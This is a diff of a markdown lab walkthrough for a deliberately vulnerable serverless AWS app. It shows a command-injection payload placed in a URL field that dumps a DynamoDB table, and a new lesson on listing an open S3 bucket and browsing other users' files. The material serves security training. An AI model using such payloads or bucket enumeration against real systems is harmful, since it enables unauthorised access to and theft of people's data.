@@ -108,9 +108,30 @@ Let's use the following payload in the URL field, and see what happens:
 ```
 https://; node -e 'const AWS = require("aws-sdk"); (async () => {console.log(await new AWS.DynamoDB.DocumentClient().scan({TableName: process.env.TABLE_NAME}).promise());})();'
 ```
-Bingo! we got the entire contents of the table:
+**Bingo!** we got the entire contents of the table:
 ```
 { Items: [ { document_url: 'https://mmm; env #', id: '9737d9bd-02d5-11e9-8e7b-4f1a91d122d7', ip: 'XX.XXX.XXX.XX' }, { document_url: 'http://mmm; env #', id: 'b7c18b3a-02ed-11e9-a3d5-175f28e986d4'
 ...
 ...
 ```
+### Lesson 5: Abusing Insecure Cloud Configurations ###
+By now, we're sure you are well aware of the many publicly open S3 buckets out there. This happens when you deploy cloud resources without following security best-practices. The same thing exists in our application. We already know the name of the bucket used by the application - we got it in the BUCKET_NAME environment variable, and frankly, it wasn't that difficult to spot it in the redirect URL of the response to the convert operation:
+
+`http://aws-serverless-repository-serverless-goat-bucket-{string}.s3-website-{region}.amazonaws.com/{uuid}`
+
+So, the bucket is called: `aws-serverless-repository-serverless-goat-bucket-{string}`
+
+Let's try to request it. Just paste the bucket name in the following format, in your browser's URL line: `http://aws-serverless-repository-serverless-goat-bucket-{string}.s3.amazonaws.com/`
+
+You should get a full listing of the entire bucket contents. For example:
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Name>aws-serverless-repository-serverless-goat-bucket-{string}</Name><Prefix></Prefix><Marker></Marker><MaxKeys>1000</MaxKeys><IsTruncated>false</IsTruncated><Contents><Key>0858ac61-cdcf-486e-93c4-c05d31e58f93</Key><LastModified>2018-12-18T12:03:22.000Z</LastModified>
+<ETag>&quot;ce1ed7ade5ee78fabeba4e31d307b67f&quot;</ETag><Size>2605</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>12776bf6-c034-4590-a1df-5dc8a5d9a810</Key><LastModified>2018-12-18T14:43:11.000Z</LastModified><ETag>&quot;f5c029f6b1af90e22f57a5cebbe14e47&quot;</ETag><Size>1942</Size><StorageClass>STANDARD</StorageClass></Contents><Contents><Key>14b7a569-6619-4117-8a01-4430b975b676</Key>
+...
+...
+```
+You can now try to browse other files in the bucket, belonging to other user's 'convert' operations by concatenating the uuid to the URL (that's the file name.
+
+
+
